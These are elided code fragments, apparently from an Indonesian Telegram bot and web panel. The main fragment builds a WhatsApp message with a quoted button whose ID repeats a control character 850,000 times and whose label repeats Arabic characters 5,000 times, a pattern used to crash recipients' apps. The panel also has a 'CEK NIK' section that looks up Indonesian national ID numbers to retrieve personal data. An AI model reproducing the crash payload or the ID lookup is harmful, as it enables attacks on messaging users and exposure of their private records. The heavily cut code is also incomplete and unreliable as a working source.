...
`;
  ...
  ctx.replyWithMarkdown(message, {
    ...
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Contact Admin", url: "https://t.me/Rapzmodz_Official" }
        ]
      ]
    }
  });
                    ...
                    contextInfo: {
                        ...
                        quotedMessage: {
                            message: {
                                ...
                                footer: "physc-x",
                                buttons: [{
                                    buttonId:"\x10".repeat(850000),    
                                    buttonText: {
                                        displayText: '؂ن؃'.repeat(5000)
                                    },
                                    type: 1 
                                }],
                                headerType: 1,
...
<section id="nik-section" class="content-section" style="display:none;">
  <div class="box">
    ...
    <button class="execute-button" id="nikBtn" style="margin-top:12px;">
      <i class="fas fa-id-card"></i> CEK NIK
    </button>
    <div id="nikResult" style="margin-top:10px;"></div>
  </div>
</section>
...
<script>
 ...
 function showSection(sectionId) {
  ...
  if (!nik) return showToast("Masukkan NIK terlebih dahulu!");

  resultDiv.innerHTML = "🔎 Mencari data untuk NIK " + nik + " ...";
  ...
  try {
    ...
    if (!data || data.errCode !== 0) {
      resultDiv.innerHTML = "❌ NIK tidak valid atau tidak ditemukan.";
      return;
    }
